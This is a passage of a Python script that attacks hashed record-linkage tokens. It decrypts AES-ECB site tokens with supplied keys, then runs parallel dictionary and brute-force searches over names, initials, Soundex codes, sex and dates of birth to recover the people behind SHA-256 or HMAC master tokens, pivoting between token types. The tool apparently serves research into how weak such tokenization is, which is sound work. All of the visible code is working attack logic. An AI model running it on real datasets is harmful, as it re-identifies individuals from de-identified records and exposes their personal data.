    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    contains = master_tokens.__contains__
    for ln in ln_chunk:
        h_ln = init_hasher(ln + SEP)
        for fi in initials_b:
            h_fi = h_ln.copy(); h_fi.update(fi + SEP)
            for g in SEX_B:
                h_sig = h_fi.copy(); h_sig.update(g + SEP)
                for dob in dobs_b:
                    h = h_sig.copy(); h.update(dob)
                    mt = digest_and_count(h)
                    if contains(mt): hits[mt] = (ln, fi, g, dob)
    return hits, HASHES

def attack_T2_fast_worker(
    sdx_ln_chunk: list,
    master_tokens: set,
    use_sdx_first_b: list,
    dobs_b: list,
    master_salt_bytes: bytes | None
) -> Tuple[Dict[bytes, tuple], int]:
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    contains = master_tokens.__contains__
    for sdx_ln in sdx_ln_chunk:
        h_ln = init_hasher(sdx_ln + SEP)
        for sdx_fn in use_sdx_first_b:
            h_fn = h_ln.copy(); h_fn.update(sdx_fn + SEP)
            for g in SEX_B:
                h_sig = h_fn.copy(); h_sig.update(g + SEP)
                for dob in dobs_b:
                    h = h_sig.copy(); h.update(dob)
                    mt = digest_and_count(h)
                    if contains(mt): hits[mt] = (sdx_ln, sdx_fn, g, dob)
    return hits, HASHES
    
def attack_T2_via_T1_worker(
    t1_hit_chunk: list, # A chunk of t1_hits.items()
    master_tokens: set,
    sdx_first: list,
    last_to_sdx: dict,
    master_salt_bytes: bytes | None
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T2-via-T1 (Dictionary) pivot."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    
    # Each item in the chunk is (mt, (ln_b, fi_b, g_b, dob_b))
    for mt, t1_preimage in t1_hit_chunk:
        # Call the original serial function
        out = attack_T2_via_T1(
            master_tokens, sdx_first, *t1_preimage, last_to_sdx, init_hasher
        )
        hits.update(out)
    return hits, HASHES

def pivot_to_T3_fast_worker(
    t4_hit_chunk: list, # A chunk of t4_pivot_hits.items()
    master_tokens: set,
    master_salt_bytes: bytes | None
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T3-via-T4 (Dictionary) pivot."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    
    # Each item is (mt, (ln_b, fn_b, g_b, dob_b))
    for mt, t4_preimage in t4_hit_chunk:
        # Call the original serial function
        out = pivot_to_T3_fast(
            master_tokens, t4_preimage[0], t4_preimage[1], t4_preimage[3], init_hasher # ln, fn, dob
        )
        hits.update(out)
    return hits, HASHES

def attack_T1_via_T2_pure_worker(
    t2_hit_chunk: list,
    master_tokens: set,
    max_fn_len: int,
    max_ln_len: int,
    master_salt_bytes: bytes | None,
    bf_max_preimages: int
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T1-via-T2 (Generator) attack with preimage cap."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    all_hits_pure = {}
    for t2_hit in t2_hit_chunk:
        sdx_ln_b, sdx_fn_b, g_b, dob_b = t2_hit
        t1_hits = attack_T1_via_T2_generator(
            master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b,
            max_ln_len, init_hasher, bf_max_preimages
        )
        t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
        for mt, t1_preimage in t1_hits.items():
            all_hits_pure[mt] = (t1_preimage, t2_preimage)
            
    return all_hits_pure, HASHES

def attack_T7_via_T2_pure_worker(
    t2_hit_chunk: list,
    master_tokens: set,
    max_fn_len: int,
    max_ln_len: int,
    master_salt_bytes: bytes | None,
    bf_max_preimages: int
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T7-via-T2 (Generator) attack."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    all_hits_pure = {}
    for t2_hit in t2_hit_chunk:
        sdx_ln_b, sdx_fn_b, g_b, dob_b = t2_hit
        t7_hits = attack_T7_via_T2_generator(
            master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b,
            max_ln_len, init_hasher, bf_max_preimages
        )
        t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
        for mt, t7_preimage in t7_hits.items():
            all_hits_pure[mt] = (t7_preimage, t2_preimage)

    return all_hits_pure, HASHES

def attack_T7_via_T1_worker(
    t1_hit_chunk: list, # A chunk of t1_hits.items()
    master_tokens: set,
    master_salt_bytes: bytes | None
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T7-via-T1 (Dictionary) pivot."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    
    # Each item in the chunk is (mt, (ln_b, fi_b, g_b, dob_b))
    for mt, t1_preimage in t1_hit_chunk:
        # Call the original serial function
        out = attack_T7_via_T1(
            master_tokens, *t1_preimage, init_hasher
        )
        hits.update(out)
    return hits, HASHES

def attack_T7_via_T2_worker(
    t2_hit_chunk: list, # A chunk of t2_hits.items()
    master_tokens: set,
    ln_by_sdx: dict,
    fn_by_sdx: dict,
    master_salt_bytes: bytes | None
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T7-via-T2 (Dictionary) pivot."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    
    # Each item in the chunk is (mt, (sdx_ln_b, sdx_fn_b, g_b, dob_b))
    for mt, t2_preimage in t2_hit_chunk:
        # Call the original serial function
        out = attack_T7_via_T2(
            master_tokens, *t2_preimage, ln_by_sdx, fn_by_sdx, init_hasher
        )
        hits.update(out)
    return hits, HASHES

def pivot_to_T4_via_T1_T2_worker(
    t1_hit_chunk: list, 
    master_tokens: set,
    max_fn_len: int,
    master_salt_bytes: bytes | None,
    bf_max_preimages: int
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T4-via-T1/T2 (Generator) attack."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    for mt, (t1_preimage, t2_preimage) in t1_hit_chunk:
        out = pivot_to_T4_via_T1_T2_generator(
            master_tokens, t1_preimage, t2_preimage,
            max_fn_len, init_hasher, bf_max_preimages
        )
        hits.update(out)
    return hits, HASHES

def pivot_to_T4_via_T7_T2_worker(
    t7_hit_chunk: list, 
    master_tokens: set,
    max_fn_len: int,
    max_ln_len: int,
    master_salt_bytes: bytes | None,
    bf_max_preimages: int
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T4-via-T7/T2 (Generator) attack."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    for mt, (t7_preimage, t2_preimage) in t7_hit_chunk:
        (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
        (ln_b, fi3_b, g_b, dob_b) = t7_preimage 
        out = pivot_to_T4_via_T7_T2_generator(
            master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b,
            max_fn_len, max_ln_len, init_hasher, bf_max_preimages
        )
        hits.update(out)
    return hits, HASHES

def pivot_to_T9_fast_worker(
    t4_hit_chunk: list, # A chunk of t4_pivot_hits.items()
    master_tokens: set,
    address_list_raw: list,
    lang: str,
    house_numbers: list,
    master_salt_bytes: bytes | None
) -> Tuple[Dict[bytes, tuple], int]:
    """Worker for parallel T9-via-T4 (Dictionary) pivot."""
    global HASHES
    HASHES = 0
    init_hasher = make_init_hasher(master_salt_bytes)
    hits = {}
    
    # Each item is (mt, (ln_b, fn_b, g_b, dob_b))
    for mt, t4_preimage in t4_hit_chunk:
        # Call the original serial function with the first name
        out = pivot_to_T9_fast(
            master_tokens, t4_preimage[1], address_list_raw, lang, house_numbers, init_hasher
        )
        hits.update(out)
    return hits, HASHES

# =============================
# Orchestrator
# =============================

def run_attack(args):
    global HASHES
    
    # Load dictionaries/distribution
    if args.dist_file:
        load_distribution(args.dist_file, args.top_n, args.bruteforce)
    else:
        use_dictionaries(args.lang, args.bruteforce)

    print(f"[*] Attacking file '{args.infile}' with columns: {args.columns}")
    print(f"[*] Attacking in language mode: {args.lang.upper()}")

    # Precomputations
    TOP_FIRST_B   = to_bytes_list(TOP_FIRST)
    TOP_LAST_B    = to_bytes_list(TOP_LAST)
    TOP_ADDRESS_  = TOP_ADDRESS[:]
    
    # DOBS_B        = [b"20000101"] 
    DOBS_B        = precompute_dobs(min_year, max_year) # <-- Use this for the real attack
    
    FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B = build_soundex_maps(TOP_FIRST_B, TOP_LAST_B)
    HOUSE_NUMBERS = precompute_house_numbers(args.lang)
    FIRST3_MAP    = build_first3_map(TOP_FIRST_B)
    last_to_sdx   = {ln_b: sdx for sdx, names in LN_BY_SDX.items() for ln_b in names}
    
    ALL_SDX_LN, ALL_SDX_FN = set(), set()
    if args.bruteforce:
        print("[*] Precomputing all possible Soundex codes...")
        ALL_SDX_LN, ALL_SDX_FN = precompute_all_soundex_codes()
        print(f"    -> Generated {len(ALL_SDX_LN)} LN codes and {len(ALL_SDX_FN)} FN codes.")
    
    MAX_FN_LEN = args.max_fn_len
    MAX_LN_LEN = args.max_ln_len
    if args.bruteforce:
        print(f"[*] Max brute-force lengths: FN={MAX_FN_LEN}, LN={MAX_LN_LEN}")
        print(f"[*] Max preimages per Soundex code: {args.bf_max_preimages}")

    # Hasher setup
    master_salt_bytes = parse_bytes(args.master_salt) if args.master_salt else None
    if master_salt_bytes:
        init_hasher = make_init_hasher(master_salt_bytes)
        print("[*] Using HMAC-SHA256(master_salt, token_input).")
    else:
        init_hasher = make_init_hasher(None)
        print("[*] Using SHA-256(token_input) (no master salt).")

    # Site key and decryption
    site_key = parse_bytes(args.site_key, expect_len=32)
    print(f"[*] Using AES-256-ECB for site token decryption (key length={len(site_key)}).")
    cols = [c.strip() for c in args.columns.split(",")]
    raw = load_site_tokens(args.infile, cols)
    dec = decrypt_columns(raw["_RAW"], site_key, cols)
    if all(len(dec[c]) == 0 for c in cols):
        print("[!] No master tokens decrypted. Check keys, format, mode.")
        return

    # Multiprocessing setup
    num_processes = multiprocessing.cpu_count()
    print(f"[*] Using {num_processes} processes for parallel tasks.")
    
    # Initialize results
    t1_hits, t2_hits, t7_hits, t4_pivot_hits, t3_pivot_hits, t9_pivot_hits = {}, {}, {}, {}, {}, {}
    t1_time = t2_time = t7_time = t4_time = t3_time = t9_time = 0.0
    t1_hits_pure, t7_hits_pure = {}, {}

    # =============================
    # MODE 1: DICTIONARY/REFERENCE MODE
    # =============================
    if not args.bruteforce:
        print("[*] Running in Dictionary/Reference Mode.")

        if args.columns == "T4,T3,T9":
            print("[*] Running baseline of attacks.")
            if "T4" in dec:
                print("[*] Attacking T4..."); start = time.time()
                t4_pivot_hits = attack_T4(dec["T4"], TOP_LAST_B, TOP_FIRST_B, DOBS_B, init_hasher)
                t4_time = time.time() - start
                print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")

        elif args.columns == "T1,T2,T4,T3,T9":
            if "T1" in dec and TOP_LAST_B:
                print("[*] Attacking T1 (Parallel)..."); start = time.time()
                ln_chunks = chunk_list(TOP_LAST_B, num_processes)
                pool_args = partial(attack_T1_fast_worker, master_tokens=dec["T1"], initials_b=INITIALS_B, dobs_b=DOBS_B, master_salt_bytes=master_salt_bytes)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, ln_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t1_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t1_time = time.time() - start
                print(f"    -> Found {len(t1_hits)} T1 preimages ({t1_time:.2f}s). Hashes: {HASHES}")
            if "T2" in dec and t1_hits:
                print("[*] Attacking T2 via T1 (Parallel)"); start = time.time()
                t1_hits_list = list(t1_hits.items())
                t1_chunks = chunk_list(t1_hits_list, num_processes)
                
                pool_args = partial(attack_T2_via_T1_worker,
                                    master_tokens=dec["T2"],
                                    sdx_first=SDX_FIRST,
                                    last_to_sdx=last_to_sdx,
                                    master_salt_bytes=master_salt_bytes)
                
                with multiprocessing.Pool(processes=num_processes) as pool:
                    results = pool.map(pool_args, t1_chunks)
                
                total_worker_hashes = 0
                for hits_dict, hash_count in results:
                    t2_hits.update(hits_dict)
                    total_worker_hashes += hash_count
                
                HASHES += total_worker_hashes
                t2_time = time.time() - start
                print(f"    -> Found {len(t2_hits)} T2 preimages ({t2_time:.2f}s). Hashes: {HASHES}")
            if "T4" in dec and t1_hits:
                print("[*] Pivoting to T4 via T1/T2..."); start = time.time()
                t2_lookup = defaultdict(list)
                for mt, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items(): t2_lookup[(g_b, dob_b)].append((sdx_ln_b, sdx_fn_b))
                for _, t1_preimage in t1_hits.items():
                    ln_b, fi_b, g_b, dob_b = t1_preimage
                    t2_matches = t2_lookup.get((g_b, dob_b), [])
                    if t2_matches:
                         for sdx_pair in t2_matches:
                             out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX, t1_preimage, sdx_pair, init_hasher)
                             t4_pivot_hits.update(out)
                    else:
                        out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX, t1_preimage, None, init_hasher)
                        t4_pivot_hits.update(out)
                t4_time = time.time() - start
                print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")

        elif args.columns == "T1,T2,T7,T4,T3,T9":
            if "T1" in dec and TOP_LAST_B:
                print("[*] Attacking T1 (Parallel)..."); start = time.time()
                ln_chunks = chunk_list(TOP_LAST_B, num_processes)
                pool_args = partial(attack_T1_fast_worker, master_tokens=dec["T1"], initials_b=INITIALS_B, dobs_b=DOBS_B, master_salt_bytes=master_salt_bytes)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, ln_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t1_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t1_time = time.time() - start
                print(f"    -> Found {len(t1_hits)} T1 preimages ({t1_time:.2f}s). Hashes: {HASHES}")
            if "T2" in dec and t1_hits:
                print("[*] Attacking T2 via T1 (Parallel)"); start = time.time()
                t1_hits_list = list(t1_hits.items())
                t1_chunks = chunk_list(t1_hits_list, num_processes)
                
                pool_args = partial(attack_T2_via_T1_worker,
                                    master_tokens=dec["T2"],
                                    sdx_first=SDX_FIRST,
                                    last_to_sdx=last_to_sdx,
                                    master_salt_bytes=master_salt_bytes)
                
                with multiprocessing.Pool(processes=num_processes) as pool:
                    results = pool.map(pool_args, t1_chunks)
                
                total_worker_hashes = 0
                for hits_dict, hash_count in results:
                    t2_hits.update(hits_dict)
                    total_worker_hashes += hash_count
                
                HASHES += total_worker_hashes
                t2_time = time.time() - start
                print(f"    -> Found {len(t2_hits)} T2 preimages ({t2_time:.2f}s). Hashes: {HASHES}")
            if "T7" in dec and t1_hits: 
                print("[*] Attacking T7 via T1..."); start = time.time()
                for _, t1_preimage in t1_hits.items():
                    out = attack_T7_via_T1(dec["T7"], *t1_preimage, init_hasher)
                    t7_hits.update(out)
                t7_time = time.time() - start
                print(f"    -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")
            if "T4" in dec and t7_hits:
                print("[*] Pivoting to T4 via T7 and T2 (Optimized, Serial)..."); start = time.time()
                t2_lookup = { (p[0], p[2], p[3]): p[1] for p in t2_hits.values() }
                for _, t7_preimage in t7_hits.items():
                    (ln_b, fi3_b, g_b, dob_b) = t7_preimage
                    sdx_ln = last_to_sdx.get(ln_b)
                    if not sdx_ln:
                        try: sdx_ln = soundex(ln_b.decode("utf-8"))
                        except: continue
                        if not sdx_ln: continue
                    sdx_ln_b = sdx_ln.encode('utf-8')
                    sdx_fn_b = t2_lookup.get((sdx_ln_b, g_b, dob_b))
                    if sdx_fn_b:
                        out = pivot_to_T4_via_T7_T2(dec["T4"], 
                                                     sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, 
                                                     LN_BY_SDX, FN_BY_SDX, init_hasher)
                    else:
                        out = pivot_to_T4_via_T7(dec["T4"], *t7_preimage, FIRST3_MAP, init_hasher)
                    t4_pivot_hits.update(out)
                t4_time = time.time() - start
                print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")

        elif args.columns in ["T2,T1,T4,T3,T9", "T2,T1,T7,T4,T3,T9", "T2,T7,T4,T3,T9"]:
             if "T2" in dec and SDX_LAST_B:
                 print("[*] Attacking T2 (Parallel) using dictionary-derived Soundex codes...")
                 start = time.time()
                 sdx_ln_chunks = chunk_list(SDX_LAST_B, num_processes) 
                 pool_args = partial(attack_T2_fast_worker,
                                     master_tokens=dec["T2"],
                                     use_sdx_first_b=SDX_FIRST_B, 
                                     dobs_b=DOBS_B,
                                     master_salt_bytes=master_salt_bytes)
                 with multiprocessing.Pool(processes=num_processes) as pool:
                     results = pool.map(pool_args, sdx_ln_chunks)
                 total_worker_hashes = 0
                 for hits_dict, hash_count in results: t2_hits.update(hits_dict); total_worker_hashes += hash_count
                 HASHES += total_worker_hashes; t2_time = time.time() - start
                 print(f"     -> Found {len(t2_hits)} T2 preimages ({t2_time:.2f}s). Hashes: {HASHES}")

             if args.columns in ["T2,T1,T4,T3,T9", "T2,T1,T7,T4,T3,T9"]:
                 if "T1" in dec and t2_hits:
                     print("[*] Attacking T1 using T2 dictionary hits..."); start = time.time()
                     for _, t2_preimage in t2_hits.items():
                         out = attack_T1_via_T2(dec["T1"], *t2_preimage, LN_BY_SDX, init_hasher) 
                         t1_hits.update(out)
                     t1_time = time.time() - start
                     print(f"     -> Found {len(t1_hits)} T1 preimages ({t1_time:.2f}s). Hashes: {HASHES}")

             if args.columns in ["T2,T1,T7,T4,T3,T9", "T2,T7,T4,T3,T9"]:
                  if "T7" in dec:
                      if args.columns == "T2,T1,T7,T4,T3,T9" and t1_hits:
                           print("[*] Attacking T7 via T1 dictionary hits..."); start = time.time()
                           for _, t1_preimage in t1_hits.items():
                               out = attack_T7_via_T1(dec["T7"], *t1_preimage, init_hasher)
                               t7_hits.update(out)
                           t7_time = time.time() - start
                           print(f"     -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")
                      elif args.columns == "T2,T7,T4,T3,T9" and t2_hits:
                           print("[*] Attacking T7 via T2 dictionary hits..."); start = time.time()
                           for t2_mt, t2_preimage in t2_hits.items(): # Iterate T2 hits
                                out = attack_T7_via_T2(dec["T7"], *t2_preimage, LN_BY_SDX, FN_BY_SDX, init_hasher)
                                # *** Store context for the T4 pivot ***
                                for t7_mt, t7_preimage in out.items():
                                    t7_hits_pure[t7_mt] = (t7_preimage, t2_preimage) # Store (T7_hit, T2_hit)
                           
                           t7_hits = {mt: pre[0] for mt, pre in t7_hits_pure.items()} # Simple map for output
                           t7_time = time.time() - start
                           print(f"     -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")
                           """for _, t2_preimage in t2_hits.items():
                                out = attack_T7_via_T2(dec["T7"], *t2_preimage, LN_BY_SDX, FN_BY_SDX, init_hasher)
                                t7_hits.update(out)
                           t7_time = time.time() - start
                           print(f"     -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")"""

             if "T4" in dec:
                if t7_hits_pure: 
                     print("[*] Pivoting to T4 via T7/T2 (Optimized)..."); start = time.time()
                     
                     # t7_hits_pure is a dict: {t7_mt: (t7_preimage, t2_preimage)}
                     # This loop is fast, O(N)
                     for t7_mt, (t7_preimage, t2_preimage) in t7_hits_pure.items():
                         
                         # Call the correct DICTIONARY function
                         out = pivot_to_T4_via_T7_T2(
                             dec["T4"], 
                             t2_preimage[0],  # sdx_ln_b
                             t2_preimage[1],  # sdx_fn_b
                             t7_preimage[1],  # fi3_b
                             t7_preimage[2],  # g_b
                             t7_preimage[3],  # dob_b
                             LN_BY_SDX,       # Pass the dictionary map
                             FN_BY_SDX,       # Pass the dictionary map
                             init_hasher
                         )
                         t4_pivot_hits.update(out)
                         
                     t4_time = time.time() - start
                     print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")
                """if t7_hits and t2_hits: 
                     print("[*] Pivoting to T4 via T7 and T2 dictionary hits..."); start = time.time()
                        for _, t2_preimage in t2_hits.items():
                         (sdx_ln_b, sdx_fn_b, g_b, dob_b) = t2_preimage
                         matching_t7_hits = []
                         for mt, t7_preimage in t7_hits.items():
                             if (t7_preimage[2] == g_b) and (t7_preimage[3] == dob_b):
                                 matching_t7_hits.append(t7_preimage)
                         for t7_preimage in matching_t7_hits:
                             out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_ln_b, sdx_fn_b, t7_preimage[1], g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher)
                             t4_pivot_hits.update(out)
                     t4_time = time.time() - start
                     print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")"""
                if t7_hits and not t2_hits:
                     print("[*] Pivoting to T4 via T7 dictionary hits only..."); start = time.time()
                     for _, t7_preimage in t7_hits.items():
                         out = pivot_to_T4_via_T7(dec["T4"], *t7_preimage, FIRST3_MAP, init_hasher)
                         t4_pivot_hits.update(out)
                     t4_time = time.time() - start
                     print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")
                elif t1_hits: 
                     print("[*] Pivoting to T4 via T1/T2 dictionary hits..."); start = time.time()
                     t1_hits_by_t2_key = defaultdict(list)
                     for mt, t1_pre in t1_hits.items():
                         try: sdx_ln = soundex(t1_pre[0].decode('utf-8'))
                         except: continue
                         t1_hits_by_t2_key[(sdx_ln.encode('utf-8'), t1_pre[2], t1_pre[3])].append((mt, t1_pre))
                     for mt, t2_pre in t2_hits.items():
                         (sdx_ln_b, sdx_fn_b, g_b, dob_b) = t2_pre
                         matching_t1_hits = t1_hits_by_t2_key.get((sdx_ln_b, g_b, dob_b), [])
                         for t1_mt, t1_preimage in matching_t1_hits:
                             out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX, t1_preimage, (sdx_ln_b, sdx_fn_b), init_hasher)
                             t4_pivot_hits.update(out)
                     t4_time = time.time() - start
                     print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")

        elif args.columns == "T1,T7,T4,T3,T9":
            if "T1" in dec and TOP_LAST_B:
                print("[*] Attacking T1 (Parallel)..."); start = time.time()
                ln_chunks = chunk_list(TOP_LAST_B, num_processes)
                pool_args = partial(attack_T1_fast_worker, master_tokens=dec["T1"], initials_b=INITIALS_B, dobs_b=DOBS_B, master_salt_bytes=master_salt_bytes)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, ln_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t1_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t1_time = time.time() - start
                print(f"    -> Found {len(t1_hits)} T1 preimages ({t1_time:.2f}s). Hashes: {HASHES}")
            if "T7" in dec and t1_hits:
                print("[*] Attacking T7 via T1..."); start = time.time()
                for _, t1_preimage in t1_hits.items():
                    out = attack_T7_via_T1(dec["T7"], *t1_preimage, init_hasher)
                    t7_hits.update(out)
                t7_time = time.time() - start
                print(f"    -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")
            if "T4" in dec and t7_hits:
                print("[*] Pivoting to T4 via T7..."); start = time.time()
                for _, t7_preimage in t7_hits.items():
                    out = pivot_to_T4_via_T7(dec["T4"], *t7_preimage, FIRST3_MAP, init_hasher)
                    t4_pivot_hits.update(out)
                t4_time = time.time() - start
                print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")
        else:
            print(f"[!] Unsupported or unimplemented dictionary column combination: {args.columns}")

    # =============================
    # MODE 2: PURE BRUTEFORCE (GENERATOR)
    # =============================
    elif args.bruteforce:
        print("[*] Running in Pure Brute-Force Mode.")
        all_sdx_ln_list = list(ALL_SDX_LN)

        if args.columns == "T2,T1,T7,T4,T3,T9":
            if "T2" in dec:
                print("[*] Attacking T2 (Pure BF, Parallel)..."); start = time.time()
                sdx_ln_chunks = chunk_list(all_sdx_ln_list, num_processes)
                pool_args = partial(attack_T2_fast_worker, master_tokens=dec["T2"], use_sdx_first_b=list(ALL_SDX_FN), dobs_b=DOBS_B, master_salt_bytes=master_salt_bytes)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, sdx_ln_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t2_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t2_time = time.time() - start
                print(f"    -> Found {len(t2_hits)} T2 ({t2_time:.2f}s). Hashes: {HASHES}")
            if "T1" in dec and t2_hits:
                print("[*] Attacking T1 via T2 (Pure BF, Parallel)..."); start = time.time()
                t2_hits_list = list(t2_hits.values())
                t2_chunks = chunk_list(t2_hits_list, num_processes)
                pool_args = partial(attack_T1_via_T2_pure_worker,
                                    master_tokens=dec["T1"],
                                    max_fn_len=MAX_FN_LEN,
                                    max_ln_len=MAX_LN_LEN,
                                    master_salt_bytes=master_salt_bytes,
                                    bf_max_preimages=args.bf_max_preimages)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, t2_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t1_hits_pure.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t1_time = time.time() - start
                t1_hits = {mt: p[0] for mt, p in t1_hits_pure.items()}
                print(f"    -> Found {len(t1_hits)} T1 ({t1_time:.2f}s). Hashes: {HASHES}")
            if "T7" in dec and t1_hits_pure:
                print("[*] Attacking T7 via T1 (Pure BF)..."); start = time.time()
                for _, (t1_preimage, t2_preimage) in t1_hits_pure.items():
                    out = attack_T7_via_T1_pure(dec["T7"], t1_preimage, t2_preimage, init_hasher)
                    t7_hits_pure.update(out)
                t7_time = time.time() - start; t7_hits = {mt: p[0] for mt, p in t7_hits_pure.items()}
                print(f"    -> Found {len(t7_hits)} T7 ({t7_time:.2f}s). Hashes: {HASHES}")
            if "T4" in dec and t7_hits_pure:
                print("[*] Pivoting to T4 via T7/T2 (Pure BF, Parallel)..."); start = time.time()
                t7_hits_list = list(t7_hits_pure.items())
                #for _, (t7_preimage, t2_preimage) in t7_hits_pure.items():
                #    out = pivot_to_T4_via_T7_T2_generator(dec["T4"], *t2_preimage[:2], *t7_preimage[1:], MAX_FN_LEN, MAX_LN_LEN, init_hasher, args.bf_max_preimages)
                #    t4_pivot_hits.update(out)
                #t4_time = time.time() - start
                t7_chunks = chunk_list(t7_hits_list, num_processes)
                pool_args = partial(pivot_to_T4_via_T7_T2_worker,
                                    master_tokens=dec["T4"],
                                    max_fn_len=MAX_FN_LEN,
                                    max_ln_len=MAX_LN_LEN,
                                    master_salt_bytes=master_salt_bytes,
                                    bf_max_preimages=args.bf_max_preimages)
                with multiprocessing.Pool(processes=num_processes) as pool: 
                    results = pool.map(pool_args, t7_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t4_pivot_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t4_time = time.time() - start
                t4_hits = {mt: p[0] for mt, p in t4_pivot_hits.items()}
                print(f"    -> Found {len(t4_pivot_hits)} T4 ({t4_time:.2f}s). Hashes: {HASHES}")

        elif args.columns == "T2,T7,T4,T3,T9":
            if "T2" in dec:
                print("[*] Attacking T2 (Pure BF, Parallel)..."); start = time.time()
                sdx_ln_chunks = chunk_list(all_sdx_ln_list, num_processes)
                pool_args = partial(attack_T2_fast_worker, master_tokens=dec["T2"], use_sdx_first_b=list(ALL_SDX_FN), dobs_b=DOBS_B, master_salt_bytes=master_salt_bytes)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, sdx_ln_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t2_hits.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t2_time = time.time() - start
                print(f"    -> Found {len(t2_hits)} T2 ({t2_time:.2f}s). Hashes: {HASHES}")
            if "T7" in dec and t2_hits:
                print("[*] Attacking T7 via T2 (Pure BF, Parallel)..."); start = time.time()
                t2_hits_list = list(t2_hits.values())
                t2_chunks = chunk_list(t2_hits_list, num_processes)
                pool_args = partial(attack_T7_via_T2_pure_worker,
                                    master_tokens=dec["T7"],
                                    max_fn_len=MAX_FN_LEN,
                                    max_ln_len=MAX_LN_LEN,
                                    master_salt_bytes=master_salt_bytes,
                                    bf_max_preimages=args.bf_max_preimages)
                with multiprocessing.Pool(processes=num_processes) as pool: results = pool.map(pool_args, t2_chunks)
                total_worker_hashes = 0
                for hits_dict, hash_count in results: t7_hits_pure.update(hits_dict); total_worker_hashes += hash_count
                HASHES += total_worker_hashes; t7_time = time.time() - start
                t7_hits = {mt: p[0] for mt, p in t7_hits_pure.items()}
                print(f"    -> Found {len(t7_hits)} T7 ({t7_time:.2f}s, preimage cap={args.bf_max_preimages}). Hashes: {HASHES}")
            if "T4" in dec and t7_hits_pure:
                print("[*] Pivoting to T4 via T7/T2 (Pure BF, Parallel)..."); start = time.time()
                t7_hits_list = list(t7_hits_pure.items())
                t7_chunks = chunk_list(t7_hits_list, num_processes)
